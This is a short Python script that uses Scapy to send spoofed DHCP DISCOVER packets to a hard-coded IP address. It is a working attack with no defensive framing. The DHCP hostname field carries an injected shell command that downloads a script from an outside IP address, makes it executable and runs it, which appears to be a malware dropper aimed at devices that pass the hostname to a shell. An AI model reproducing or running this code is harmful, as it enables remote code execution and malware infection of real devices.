from scapy.all import *
import random

def scapy_send_dhcp_discover_requests(number_of_packets, host):
    for _ in range(number_of_packets):
        dhcp_discover_request = Ether(src='ff:ff:ff:ff:ff:ff', dst='ff:ff:ff:ff:ff:ff') /\
                                IP(src='193.104.222.146', dst=host) /\
                                UDP(dport=67, sport=68) /\
                                BOOTP(chaddr='ff:ff:ff:ff:ff:ff', xid=random.randint(1, 4294967295)) /\
                                DHCP(options=[('message-type', 'discover'),("requested_addr",host),("hostname","wget http://77.68.125.237/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh"),("param_req_list","pad"), 'end'])
        sendp(dhcp_discover_request, verbose=False)

scapy_send_dhcp_discover_requests(1, '223.166.174.21')